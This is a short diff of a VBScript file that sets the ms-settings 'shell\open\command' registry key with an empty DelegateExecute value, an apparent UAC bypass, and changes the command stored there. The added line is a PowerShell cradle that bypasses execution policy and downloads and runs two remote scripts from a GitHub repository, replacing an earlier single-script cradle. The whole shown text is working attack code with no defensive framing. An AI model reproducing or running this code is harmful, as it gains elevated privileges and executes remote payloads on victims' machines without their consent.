@@ -6,7 +6,7 @@ Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
 Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
 Const DefaultRegKeyName = ""
-Const DefaultRegKeyValue = "powershell -exec bypass -w 1 (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/boomer/master/WV1.ps1') | IEX"
+Const DefaultRegKeyValue = "powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R1.ps1'); IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R2.ps1')"
 
 Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
 Set Registry = GetObject(RegObjectPath)
